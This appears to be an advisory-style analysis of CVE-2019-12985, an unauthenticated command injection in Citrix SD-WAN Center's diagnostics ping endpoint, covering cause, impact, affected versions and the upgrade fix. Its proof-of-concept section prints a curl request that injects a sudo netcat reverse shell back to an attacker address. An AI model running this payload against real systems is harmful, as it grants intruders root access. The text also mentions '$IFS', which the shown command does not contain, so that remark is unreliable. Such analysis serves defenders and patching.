Based on the provided content, here's an analysis of CVE-2019-12985:

**Root Cause of Vulnerability:**

The root cause is **Improper Input Validation** in the `/Collector/diagnostics/ping` endpoint of the Citrix SD-WAN Center. Specifically, the `ping` function within the `DiagnosticsController` does not properly sanitize or validate HTTP request parameter values before using them to construct a shell command.

**Weaknesses/Vulnerabilities Present:**

*   **Command Injection:** The vulnerability is a command injection flaw. Because user-supplied parameters are used to build shell commands without sanitization, an attacker can inject arbitrary commands.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** An attacker can execute arbitrary shell commands on the affected system. Since the `www-data` user has sudo privileges, successful exploitation leads to gaining root access.
*   **Full System Compromise:** The attacker can potentially take full control of the Citrix SD-WAN Center.
*   **Data Breach/Manipulation:** Attackers could potentially access sensitive information, modify configurations, and cause disruption.

**Attack Vectors:**

*   **Network:** A remote attacker can exploit the vulnerability by sending crafted HTTP requests.
*   **Unauthenticated:** The vulnerability is exploitable without authentication.

**Required Attacker Capabilities/Position:**

*   The attacker must be able to send HTTP requests to the vulnerable Citrix SD-WAN Center, routing the traffic through the `Collector` controller.
*   The attacker needs to be able to specify values for the `ipAddress`, `pingCount`, or `packetSize` parameters in the HTTP request.

**Technical Details:**

The vulnerability exists because the application directly uses untrusted user input (`ipAddress`, `pingCount`, or `packetSize` parameters from an HTTP request) in constructing a shell command. By injecting shell metacharacters and commands within these parameters, an attacker can bypass the intended functionality and execute arbitrary code.

**Proof of Concept:**

The provided proof of concept demonstrates how to exploit this vulnerability using a `curl` command:

```
ncip=192.168.1.191
ncport=4444
target=192.168.1.198

curl --insecure -d 'ipAddress=%60sudo+/bin/nc+-nv+'$ncip'+'$ncport'+-e+/bin/bash%60' https://$target/Collector/diagnostics/ping
```

This command attempts to inject a netcat command that will connect back to the attacker's machine, opening a reverse shell. The `%60` represents a backtick, used to execute shell commands, and `$IFS` represents an internal field separator.

**Affected Versions:**

*   Citrix SD-WAN 10.2.x before 10.2.3
*   NetScaler SD-WAN 10.0.x before 10.0.8

**Solution:**

Upgrade to version 10.0.8 or 10.2.3

**Additional Notes:**

This is issue 1 of 6 vulnerabilities discovered in Citrix SD-WAN Center by Tenable. The other vulnerabilities are similar command injection flaws and directory traversal. All can be exploited to gain root access due to the `www-data` user having `sudo` privileges.
